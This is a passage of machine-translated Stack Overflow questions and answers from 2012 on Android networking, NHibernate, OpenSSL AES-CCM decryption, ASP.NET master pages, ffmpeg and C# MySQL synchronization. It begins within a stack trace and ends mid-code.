05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.ActivityThread.deliverResults(ActivityThread.java:2980)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.ActivityThread.handleSendResult(ActivityThread.java:3023)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.ActivityThread.access$1100(ActivityThread.java:123)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1177)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.os.Handler.dispatchMessage(Handler.java:99)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.os.Looper.loop(Looper.java:137)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.ActivityThread.main(ActivityThread.java:4424)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at java.lang.reflect.Method.invokeNative(Native Method)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at java.lang.reflect.Method.invoke(Method.java:511)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at dalvik.system.NativeStart.main(Native Method)
05-25 15:42:30.511: E/AndroidRuntime(3785): Caused by: android.os.NetworkOnMainThreadException
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1099)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl$SSLInputStream.read(OpenSSLSocketImpl.java:664)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.io.Streams.readSingleByte(Streams.java:41)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl$SSLInputStream.read(OpenSSLSocketImpl.java:655)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpConnection.isStale(HttpConnection.java:256)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpConnectionPool.get(HttpConnectionPool.java:71)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpConnection.connect(HttpConnection.java:128)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpEngine.openSocketConnection(HttpEngine.java:308)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.makeSslConnection(HttpsURLConnectionImpl.java:460)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.connect(HttpsURLConnectionImpl.java:432)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:282)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:232)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:273)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:168)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at libcore.net.http.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:270)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at com.facebook.android.Util.openUrl(Util.java:206)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at com.facebook.android.Facebook.request(Facebook.java:751)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at com.facebook.android.Facebook.request(Facebook.java:688)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at org.apache.cordova.facebook.ConnectPlugin$AuthorizeListener.onComplete(ConnectPlugin.java:271)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at com.facebook.android.Facebook.authorizeCallback(Facebook.java:433)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at org.apache.cordova.facebook.ConnectPlugin.onActivityResult(ConnectPlugin.java:196)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at org.apache.cordova.DroidGap.onActivityResult(DroidGap.java:1178)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.Activity.dispatchActivityResult(Activity.java:4649)
05-25 15:42:30.511: E/AndroidRuntime(3785):     at android.app.ActivityThread.deliverResults(ActivityThread.java:2976)
05-25 15:42:30.511: E/AndroidRuntime(3785):     ... 11 more 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-27T16:42:58.613

我设法通过将身份验证部分`ConnectPlugin.java`放在单独的线程中来解决错误。对于未来的读者，我将在下面发布说明。

在`ConnectPlugin.java`中，替换：

```
try {
    JSONObject o = new JSONObject(this.fba.facebook.request("/me"));
    this.fba.userId = o.getString("id");
    this.fba.success(getResponse(), this.fba.callbackId);
} catch (MalformedURLException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} catch (JSONException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
```

使用以下代码：

```
Thread t = new Thread(new Runnable() {
    public void run() {
        try {
            JSONObject o = new JSONObject(fba.facebook.request("/me"));
            fba.userId = o.getString("id");
            fba.success(getResponse(), fba.callbackId);
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
});
t.start(); 
```

那应该修复`NetworkOnMainThreadException`.

# asp.net - Nhibernate、WindsorContainer、ASP.NET 和多租户

> ID：10757578
> 
> 赞同：0
> 
> 时间：2012-05-25T15:51:07.707
> 
> 标签：asp.net, nhibernate, fluent-nhibernate, castle-windsor

我们正在尝试在我们的 asp.net（Web 表单）应用程序中实现多租户。我们为每个租户提供单独的数据库。我们有一个主数据库，用于存储租户数据库的配置字符串。我们正在使用 Application_start (Global.asax) 处理所有连接字符串并为每个租户注入所有会话（别名）。每件事都很好。

我们想引入在主数据库中创建新租户数据库和连接字符串的功能，应用程序应该能够在不重新启动网站（IIS 重新启动）的情况下为新租户提供服务。

我可以得到一些提示如何在不重新启动网站的情况下实现它吗？

谢谢

Shishir Kumar Mishra

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-29T13:08:23.467

虽然这个实现是关于使用嵌入式数据库进行测试，但它应该足以给你一个想法。

[http://www.codeproject.com/Articles/18348/TDD-using-SqlCE-and-NHibernate](http://www.codeproject.com/Articles/18348/TDD-using-SqlCE-and-NHibernate)

# .net - MonoTouch 中的 System.Runtime.Caching.MemoryCache

> ID：10757580
> 
> 赞同：3
> 
> 时间：2012-05-25T15:51:16.893
> 
> 标签：.net, xamarin.ios, memorycache

在 MonoTouch 中是否可以访问System.Runtime.Caching.MemoryCache [？](http://msdn.microsoft.com/en-us/library/system.runtime.caching.memorycache.aspx)如果没有，有没有人知道等效的？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T17:23:14.290

`System.Runtime.Caching.dll`MonoTouch（和 Android 的 Mono）中使用的移动（SilverLight 超集）配置文件中不存在。

它受Mono 2.11 (*不稳定)*[支持](https://github.com/mono/mono/blob/master/mcs/class/System.Runtime.Caching/System.Runtime.Caching/MemoryCache.cs)，因此将来可能会可用。IOW MonoTouch 将基于 Mono 2.12（即 2.11 升级为稳定版）。现在 MonoTouch 正在遵循*稳定*的Mono 2.10 分支。

 **当然，由于 Mono 是开源的，您可以在自己的应用程序中编译/尝试它。**

# gcc - Reduce size of DLL created directly with GCC

> ID：10757581
> 
> 赞同：3
> 
> 时间：2012-05-25T15:51:17.417
> 
> 标签：gcc, dll, size, reduce

Hi1 I just created a DLL with GCC. It only contains this simple function:

```
extern "C" {
    char* Message() {
        return (char*)"Cool";
    }
} 
```

The resulted file's size is 42 Kb and I don't understand why is it so big, when a simple executable that creates and shows a GUI window only weights 8 Kb. Is there a way of reducing the size of the shared library? Why is it so big? Thanks!

**UPDATE**

If I create the same file with Code::Blocks, it only has 24 Kb. I wonder what way does CB create it in order to achieve that size?

**UPDATE**

It matters because I want to know that my library doesn't contain unnecessary code. My GCC command to create the DLL is:

```
gcc -c Source/MyLib.cpp -s -Os -nostartfiles -nostdlib -nodefaultlibs -o MyLib.o
ar  rcs libMylib.a MyLib.o
gcc -shared -o MyLib.dll MyLib.o 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:53:10.723

Add `-s` to the linking state (`gcc -s -shared -o MyLib.dll MyLib.o`)

# c - 使用openssl EVP在C中解密aes ccm 128，mic 8bit

> ID：10757587
> 
> 赞同：1
> 
> 时间：2012-05-25T15:51:34.403
> 
> 标签：c, cryptography, openssl, aes

我需要使用openssl用8字节的麦克风解密aes 128 ccm，但我的输出总是空的，这是我的代码：

```
void aes(){
unsigned char * aad = extochar("0841000CF635DFAB74F06D40A6A30090");

unsigned char * cipher = extochar("A52B1A6537FD99E79F49DABDCB2B297E096E0ACA95CF897D5099CBE43181C632DBE6BAAD8C15B0846839ADE68203C75DA7B5D415BA181105F8ADB199B707DFFE2944462948E775A7B946AFBACC7D90DA9831BEDC8961A3A49D3064EEFCABA0283ED4C55824B8BED8FCCFF2A0B4E9C86289BE3EEC3A4CE5BE1C95069CA97882E05EA211A0DD0EBF665E10CBE12B8ACBD1BAB390925FE9B5DFCB1A74EC897E220BF018DC3749A80C109976A72827DB407F491AC10D94FFF8DD0CC5738468E662CE32A5AD2A2B4FD37C50577B601E45C67199393C9B22CF4F4652E1B718FF5D2D614EA4B5CC10C954EEDFC2D3DA24E5A119E74697F708862ED5C499C7B42E55BF67C5B618E20A7EB5EB51B256825D70F38A51B0808034B4BE7A7C20CACC12CC5D8EF76E2859DF6A4089F6AC5DFB11FB49D994CDDB362340130D2BA31B0D880F4494C3E04B21C089A4B9204FB964A2080050C44E987000DE39326CDC69D95F83D47B60DA65DE0FC95271E1B082CC79B1F9E92ECE50C8FA2A9A922EC252770503310DED86ABC64C03FF0ED5EBBB2AD6CD8C997C6AA93C56D30B7C65B97F048CBC3196B338D121D10F4DE3F867EE21FCDB204EDD55867B3E3D3B703F");
//unsigned char * mic = extochar("8f3829e8e76ee23c04f566189e63c686");
int cipher_size  = strlen("A52B1A6537FD99E79F49DABDCB2B297E096E0ACA95CF897D5099CBE43181C632DBE6BAAD8C15B0846839ADE68203C75DA7B5D415BA181105F8ADB199B707DFFE2944462948E775A7B946AFBACC7D90DA9831BEDC8961A3A49D3064EEFCABA0283ED4C55824B8BED8FCCFF2A0B4E9C86289BE3EEC3A4CE5BE1C95069CA97882E05EA211A0DD0EBF665E10CBE12B8ACBD1BAB390925FE9B5DFCB1A74EC897E220BF018DC3749A80C109976A72827DB407F491AC10D94FFF8DD0CC5738468E662CE32A5AD2A2B4FD37C50577B601E45C67199393C9B22CF4F4652E1B718FF5D2D614EA4B5CC10C954EEDFC2D3DA24E5A119E74697F708862ED5C499C7B42E55BF67C5B618E20A7EB5EB51B256825D70F38A51B0808034B4BE7A7C20CACC12CC5D8EF76E2859DF6A4089F6AC5DFB11FB49D994CDDB362340130D2BA31B0D880F4494C3E04B21C089A4B9204FB964A2080050C44E987000DE39326CDC69D95F83D47B60DA65DE0FC95271E1B082CC79B1F9E92ECE50C8FA2A9A922EC252770503310DED86ABC64C03FF0ED5EBBB2AD6CD8C997C6AA93C56D30B7C65B97F048CBC3196B338D121D10F4DE3F867EE21FCDB204EDD55867B3E3D3B703F")/2;
unsigned char * key = extochar("C7134FD10709F028D63C2E05CBB4C16C");
unsigned char * nonce = extochar("0074F06D40A6A3000000000011");
int nonce_size = strlen("0074F06D40A6A3000000000011")/2;

int aad_size = strlen("0841000CF635DFAB74F06D40A6A30090")/2;
unsigned char plain[cipher_size];
int mic_size = 8;

EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
EVP_CIPHER_CTX_init(ctx);

// Just set the alg
EVP_DecryptInit(ctx, EVP_aes_128_ccm(), 0, 0);

// Set nonce size
EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_CCM_SET_IVLEN, nonce_size, 0);

// Set the tag from the end of the encrypted array
EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_CCM_SET_TAG, mic_size, cipher +sizeof(unsigned char)*(cipher_size -8));

// Set key and nonce
EVP_DecryptInit(ctx, 0, key, nonce);

int outl = 0;
// We will encrypt Psize bytes
EVP_DecryptUpdate(ctx, 0, &outl, 0, cipher_size);

// Add AAD for verification
EVP_DecryptUpdate(ctx, 0, &outl, aad, aad_size);

// Time to decrypt the data into D
EVP_DecryptUpdate(ctx, plain, &outl, cipher, cipher_size);

// Not sure if this is needed
EVP_DecryptFinal(ctx, &plain[outl], &outl);

int i;
printf("plaintext");
for(i=0; i<cipher_size; i++)
    printf("%.2x",plain[i]);
printf("\n"); 
```

函数 extochar 如下：

```
char * extochar(char* string)
{
    unsigned char * out = malloc(sizeof(unsigned char)*strlen(string)/2);
    int i;
    for (i = 0; i < strlen(string)/2; i++)
    {
        sscanf(&string[2*i], "%02x", (unsigned int *)(&out[i]));
    }
    return out;
} 
```

明文应该以

```
AA AA 03 00 00 00 08 00 45 00 01 A9 0F DC 40 00 40 06 E6 14 27 E9 64 63 D1 55 E5 BC 8F B4 14 6C 
```

[并且此链接](http://www.mail-archive.com/stds-p1619@listserv.ieee.org/msg00548/ccm.2)的最后一个测试向量 有效（我只测试了那个，将 EVP_aes_128_ccm() 更改为 EVP_aes_256_ccm() 并将麦克风大小更改为 16）

怎么了？非常感谢您的建议！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:41:15.310

我已经通过以下步骤实现了 GCM 解密。请看看它是否可以帮助你。

```
//Step 1: Set cipher.
retval  = EVP_DecryptInit (ctx, EVP_aes_128_gcm(), (const unsigned char *)key, (const unsigned char *)iv);
if(retval <= 0) {
   //Error
}

//Step 2: Set tag. Extract the tag from the message if required.
retval  = EVP_CIPHER_CTX_ctrl (ctx, EVP_CTRL_CCM_SET_TAG, taglen, (void *)tag);
if(retval <= 0) {
    //Error
}

//Step 3: Add AAD.
retval  = EVP_DecryptUpdate (ctx, NULL, (int *)&len, (const unsigned char *)add, (int)aadlen);
if(retval <= 0) {
    //Error
}

//Step 4: Decrypt the data.
buflen = 0;
retval  = EVP_DecryptUpdate (ctx, (unsigned char *)buf, (int *)&buflen, (const unsigned char *)inbuf, inbuflen);
if(retval <= 0) {
    //Error
}

//This step is necessary
//If this step fails, means authentication fails.
retval  = EVP_DecryptFinal(ctx, (unsigned char *)buf + buflen, (int *)&buflen);
if(retval <= 0) {
  //Error and discard the decrypted data so far.
}

//Clean up.
EVP_CIPHER_CTX_cleanup (ctx); 
```

# asp.net-mvc - 如何在 Razor 和 Webforms 之间共享母版页

> ID：10757589
> 
> 赞同：2
> 
> 时间：2012-05-25T15:51:44.147
> 
> 标签：asp.net-mvc, razor, webforms

我之前问过这个问题，但问题是我得到了一个答复，而该答复不是针对我提出的问题。因此，为了清楚地说明这一点，这个问题不是关于什么的：

**我不想在同一个项目中使用 HYBRID、MVC 和 Webforms！**

有人可以为我提供一个链接，显示两个项目与一个母版页并排运行吗？一个项目是包含母版页的 ASP.Net Web 表单。另一个项目是 MVC Razor 项目。母版页将提供指向 .aspx 页面以及 .cshtml 视图的链接。**这两个项目都应该是 C#。**我需要能够下载源代码，以亲眼看看这一切是如何工作的。

**答案 #1 不是我正在寻找的答案。我的问题非常具体。**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:02:27.743

据我所知，这是不可能的，原因有两个：

*   您不能从应用程序外部使用 .master 页面。它必须是应用程序的一部分（作为文件或作为与 VirtualPathProvider 技巧结合的库的嵌入式资源）。
*   您不能使用 .cshtml 中的 .master 页面，就像您不能使用 .aspx 页面中的 .cshtml 布局文件作为 MasterPageFile 一样。

因此，直接重用现有的 .master 页面似乎是不可能的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T16:00:12.970

由于这是两种不同的技术，您将无法使用相同的*文件*。您需要有一个用于 WebForms 应用程序的 MasterPage 和一个用于 MVC 应用程序的看起来相同的布局。

如果您的 MasterPage/Layout 没有动态内容并且它只是纯 html，我认为您可以将它放在一个文件中并创建一个脚本来从中创建 MasterPage 和 Layout 文件，但我认为这不值得。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T15:54:26.313

我建议使用 MVC Razor 代替布局。

[http://weblogs.asp.net/scottgu/archive/2010/10/22/asp-net-mvc-3-layouts.aspx](http://weblogs.asp.net/scottgu/archive/2010/10/22/asp-net-mvc-3-layouts.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-25T16:02:41.723

我无法向您展示完整的来源。不是我要展示的。但我可以给你看这个。这是我们用于使用 WebForm 母版页呈现剃刀视图的部分内容。

---razorview.aspx---

```
<%@ Page Title="" Language="C#" MasterPageFile="~/Views/Shared/Site.Master" Inherits="System.Web.Mvc.ViewPage<dynamic>" %>

<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    <% Html.RenderPartial((string) ViewBag._ViewName); %>
</asp:Content>
<asp:Content ID="scriptContent" ContentPlaceHolderID="ScriptContent" runat="server">

</asp:Content> 
```

- -用法 - -

```
 public ActionResult Create(int clientId)
 {
....
return this.RazorView(choices); 
```

---site.master（已编辑）---

```
<%@ Master Language="C#" Inherits="System.Web.Mvc.ViewMasterPage" %>

<%@ Import Namespace="...." %>
<!DOCTYPE html>
<html>
<head id="Head1" runat="server">
    <title>Some Alt</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />   
    <link href="../../Site.css" rel="stylesheet" type="text/css" />
    <asp:ContentPlaceHolder ID="ScriptContent" runat="server" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="-1" />
</head>
<body>
    <div class="page">
        <div id="main">
            <table width="100%">
                <tr>
                    <td valign="top" width="150" height="50">
                        <img src="<%= Common.CompanyLogoPath%>" alt="Some Alt width="150"
                            height="50" />
                    </td>
                    <td align="left" width="630" height="50" class="mainheading">
                        Description
                    </td>
                    <td align="right" valign="bottom">
                        <%= DateTime.Now.FormatShortDate() %>
                    </td>
                </tr>
                <tr>
                    <td colspan="3">
                        <hr />
                    </td>
                </tr>
                <tr>
                    <td valign="top" class="rightBorder">
                        <table>
                           .....
            </table>
        </div>
    </div>
</body>
</html> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-08T15:26:15.360

Scott Hanselman 像往常一样对此有一些选择。你可以做到，但它并不漂亮：

[http://www.hanselman.com/blog/MixingRazorViewsAndWebFormsMasterPagesWithASPNETMVC3.aspx](http://www.hanselman.com/blog/MixingRazorViewsAndWebFormsMasterPagesWithASPNETMVC3.aspx)

# adapter - 使用 Winformexample SharpPcap Addapter 问题

> ID：10757593
> 
> 赞同：0
> 
> 时间：2012-05-25T15:51:49.693
> 
> 标签：adapter, capture, sharppcap

如何刷新 C# 中的适配器列表？

假设发生以下情况：

*   列出设备，我看到了设备。
*   我在不启动软件的情况下拔掉插头并重新插入。
*   设备从：`\\.\airpcap00 AirPcap USB wireless capture adapter nr. 00`变为 `\\.\airpcap01 AirPcap USB wireless capture adapter nr. 01`

*   但设备列表似乎仍然显示：`\\.\airpcap00 AirPcap USB wireless capture adapter nr. 00`

如何刷新设备以显示正确的列表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T18:44:31.457

使用 WinPcapDeviceList.Instance.Refresh() 或 AirPcapDeviceList 或 LibPcapDeviceList 刷新列表。

# qt - VS2010 中 Qt 4.8.2 的文档

> ID：10757596
> 
> 赞同：0
> 
> 时间：2012-05-25T15:51:51.743
> 
> 标签：qt

Visual Studio 插件 1.1.11 的亮点包括：

对 Visual Studio 2010 的文档支持，并更新了文档 修复了总是 moc'ing 的问题。(QTVSADDINBUG-92) 修复了 .pro 文件打开时包含“.”的问题 小路。(QTVSADDINBUG-117)

集成文档如何使用？</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:00:55.983

[Visual Studio 插件](http://qt.nokia.com/downloads/visual-studio-add-in)进行文档集成以及使 Qt 与 Qt 完美配合所需的一切

# java - Parcel.readHashMap 使用什么类加载器？

> ID：10757598
> 
> 赞同：11
> 
> 时间：2012-05-25T15:51:53.023
> 
> 标签：java, android, generics, classloader, parcelable

我正在使用以下代码`HashMap<String, String`从 Parcel 中读取类型为 > 的地图：

```
in.readHashMap(HashMap.class.getClassLoader()); 
```

这似乎工作得很好，但我收到一个警告：

```
Type safety: The expression of type HashMap needs unchecked conversion to conform to Map<String,String> 
```

有没有“正确”的方法来做到这一点，使用不同的类加载器？还是我应该选择`@SuppressWarnings("unchecked"`)？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-25T16:07:49.037

Android 开发者文档`Parcel.readHashMap()`说：

> 请`readBundle(ClassLoader)`改用（其数据必须使用`writeBundle(Bundle)`.

所以也许你应该使用`readBundle()`and`writeBundle()`代替。

# javascript - 跟随 html5 画布和 box2d 中的主体

> ID：10757600
> 
> 赞同：3
> 
> 时间：2012-05-25T15:51:55.130
> 
> 标签：javascript, box2d, html5-canvas

我正在使用物理引擎 box2dweb ，我的问题是我有一个身体并且我想跟随他，例如我的画布宽度：500px 高度：500px 并且身体协调是（700,200）所以我看不到他所以如何让他可见在我的画布上

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-24T09:03:37.360

你应该使用box2dweb的调试图。

```
function debugDraw(){
    var debugDraw = new b2DebugDraw();
//replace canvas with your canvas id
    debugDraw.SetSprite(document.getElementById("canvas").getContext("2d"));
    debugDraw.SetDrawScale(30.0);
    debugDraw.SetFillAlpha(0.5);
    debugDraw.SetLineThickness(1.0);
    debugDraw.SetFlags(b2DebugDraw.e_shapeBit | b2DebugDraw.e_jointBit);
    world.SetDebugDraw(debugDraw); // replace world with your box2dworld
} 
```

将此功能放入您的游戏循环中。

# asp.net-mvc - 文件上传绑定到 Viewmodel

> ID：10757604
> 
> 赞同：9
> 
> 时间：2012-05-25T15:52:09.087
> 
> 标签：asp.net-mvc, file-upload, viewmodel

我有一个表单，我正在上传多个文件，并且有几个文本框和一些复选框与每个正在上传的文件相关联。我已经看到了上传多个文件的示例，其中 actionresult 签名是这样的：

```
[HttpPost]
public ActionResult Upload(IEnumerable<HttpPostedFileBase> fileUpload) 
```

但是，我找不到任何可以上传多个文件的示例，其中我的 actionresult 签名是这样的：

```
[HttpPost]
public ActionResult Upload(MyViewModel vm) 
```

我希望发布此视图模型的原因是因为我认为它比使用 FormCollection 变量更干净，并且因为我希望上传的每个文件以及添加的数据及其关联的文本框`List<FileUploadPacket>`通过视图模型

**更新**

我的视图模型如下：

```
public class EmployeeVM  
{

    public int EmployeeID {get ;set;}
    public string EmpName {get ;set;}
    //Other properties

    public List<FileUploadPacket> FileUploadPackets { get; set; }
} 
```

具有 HttpPostedFileBase 类型属性的 FileUploadPacket 类

```
public class FileUploadPacket 
{

    public int FileID {get ;set;}
    public string UserEnteredDesc {get ;set;}
    //some more other properties

    public HttpPostedFileBase UpFile { get; set; }
} 
```

我的 view.aspx 的代码片段如下

```
<%: Html.TextBoxFor(model => model.EmpName, new { maxLength = 50 })%>

Upload your files here: 
<input type="file" id="UpFile" name="UpFile" value="ActionHandlerForForm"  />
<%: Html.TextBoxFor(model => model.FileUploadPackets[0].UserEnteredDesc )%>

<input type="file" id="UpFile" name="UpFile" value="ActionHandlerForForm"  />
<%: Html.TextBoxFor(model => model.FileUploadPackets[1].UserEnteredDesc )%> 
```

如您所见，我将特定于这个文件的所有其他属性都保存在它自己的类中。因此，在我的表格中，员工可以输入他的姓名并上传他的文件，并为每个文件提供一些描述和其他详细信息。如果我将公共`HttpPostedFileBase UpFile { get; set; }`属性移动到`EmployeeVM`类，那么我将不得不将所有文件分别收集到一个数组中，并手动将文件映射到它的描述。有没有办法将`UpFile`属性保留在`FileUploadPacket`类本身中？

我正在使用 aspx 视图引擎。

请帮忙。谢谢你的时间...

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-25T16:01:56.573

`GetHtml`助手不是 mvc 框架的一部分，您应该查找包含该助手的第三方库。

上传属于 ViewModel 的文件很简单。基本上是这样的

定义视图模型

```
public class MyViewModel 
{
     public HttpPostedFileBase MyFile { get; set; }
} 
```

在里面`Views/Shared/EditorTemplates`，创建`MyViewModel.cshtml`

```
<input type="file" id="MyFile" name="MyFile" /> 
```

和view，对应上传动作

```
@model MyViewModel

@using(Html.BeginForm("Upload", "MyController", FormMethod.Post, new { enctype="multipart/form-data"})
{
     @Html.EditorForModel()
    <input type="submit" value="Upload" />
} 
```

required 属性对于上传文件很重要。

就是这样，一旦提交表单，您应该会在`[HttpPost]`操作中看到上传的文件，`vm.MyFile`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-31T12:58:12.877

解决此问题的方法是更改​​您命名和标识上传控件的方式。

```
<%: Html.TextBoxFor(model => model.EmpName, new { maxLength = 50 })%>

Upload your files here: 
<input type="file" id="FileUploadPackets[0].UpFile" name="FileUploadPackets[0].UpFile" value="ActionHandlerForForm"  />
<%: Html.TextBoxFor(model => model.FileUploadPackets[0].UserEnteredDesc )%>

<input type="file" id="FileUploadPackets[1].UpFile" name="FileUploadPackets[1].UpFile" value="ActionHandlerForForm"  />
<%: Html.TextBoxFor(model => model.FileUploadPackets[1].UserEnteredDesc )%> 
```

这对我有用！希望它可以帮助其他人在那里..

# ffmpeg - 静止图像到视频以供存储 - 但返回静止图像以供查看

> ID：10757606
> 
> 赞同：1
> 
> 时间：2012-05-25T15:52:16.783
> 
> 标签：ffmpeg, jpeg, h.264, compression

使用 ffmpeg，我可以拍摄许多静止图像并将它们转换为视频。我想这样做是为了减小我所有延时照片的总大小。但我也想提取静止图像以备日后使用。

为了使用这种方法： - 我需要将原始静止图像与视频中的帧号相关联。- 我需要提取视频中给定帧号的缩略图。

但在我进入这个兔子洞之前，我想知道使用 ffmpeg 是否可以满足这些要求，如果可以，是否有任何关于如何完成任务的提示。

注意：静止图像是一天内单个相机的延时摄影，因此与一堆 jpeg 相比，时间压缩是可测量的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T17:45:57.417

当您使用 ffmpeg 从一系列图像创建视频时，图像不会受到任何影响。除非我误解了您的问题，否则您仍然应该能够将它们用于您想做的事情。

编辑：您可以使用 ffmpeg 从现有视频创建图像。我不确定它对您的目的有多好，但图像质量相当高，如果与原件不同的话。您必须使用它来确保提取的图像与输入图像的顺序和命名完全相同，但如果您考虑到 fps，它应该可以工作。

执行此操作的命令（来自 ffmpeg[文档](http://ffmpeg.org/faq.html#How-do-I-encode-movie-to-single-pictures_003f)）如下：

> ffmpeg -i 电影.mpg 电影%d.jpg

# c# - 如何在 C# 中同时打开两个连接以同步两个数据库 mysql？

> ID：10757617
> 
> 赞同：1
> 
> 时间：2012-05-25T15:52:59.247
> 
> 标签：c#, mysql, database, synchronization

大家好！我正在尝试同步两个数据库，一个是本地的，一个是远程的。问题是我同时打开了两个连接并且不知道如何。如果我正确更新了这两个数据库，我在本地拥有它们，因为它们使用相同的连接。我遇到的问题是本地板子更新程序看不到它，因为连接没有打开，我该怎么办？这是我的代码。两个数据库具有相同的表结构，但用户/密码和不同的数据库名称。谢谢！

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using MySql.Data;
using MySql.Data.MySqlClient;

namespace sincronizacion
{
public partial class Form1 : Form
{
    private string stringConexionLocal ="server=localhost;database=kiosco_m;UID=root;pwd=toor";
    private string stringConexionRemota = "server="ipserverremote";database=grupoorb_kioscom;UID=user_remote;pwd=pass_remote";

    //Instanciado de objetos conexión local
    MySqlConnection conexionLocal;
    MySqlDataAdapter dataAdapterLocal;
    DataSet dataSetLocal;
    MySqlCommandBuilder builderLocal;

    //Instanciado de objetos conexión remota
    MySqlConnection conexionRemota;
    MySqlDataAdapter dataAdapterRemota;
    DataSet dataSetRemoto;
    MySqlCommandBuilder builderRemoto;

    public Form1()
    {
        InitializeComponent();
    }

    private void CargarDatosLocal()
    {
        string Consulta = "SELECT * FROM empresas";
        try
        {
            conexionLocal = new MySqlConnection(this.stringConexionLocal);
            dataAdapterLocal = new MySqlDataAdapter(Consulta, conexionLocal);
            dataSetLocal = new DataSet();
            dataAdapterLocal.Fill(dataSetLocal, "empresas");
            builderLocal = new MySqlCommandBuilder(dataAdapterLocal);
            dataGridView1.DataSource = dataSetLocal;
            dataGridView1.DataMember = "empresas";
        }
        catch (MySqlException ex)
        {
            MessageBox.Show(ex.Message, "Error al intentar conectarse a la BBDD local.", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

    }

    private void CargarDatosRemoto()
    {
        string Consulta = "SELECT * FROM empresas";
        try
        {
            conexionRemota = new MySqlConnection(this.stringConexionRemota);
            dataAdapterRemota = new MySqlDataAdapter(Consulta, conexionRemota);
            dataSetRemoto = new DataSet();
            dataAdapterRemota.Fill(dataSetRemoto, "empresas");
            builderRemoto = new MySqlCommandBuilder(dataAdapterRemota);
            dataGridView2.DataSource = dataSetRemoto;
            dataGridView2.DataMember = "empresas";

        }
        catch (MySqlException ex)
        {
            MessageBox.Show(ex.Message, "Error al intentar conectarse a la BBDD Remota.", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

    }

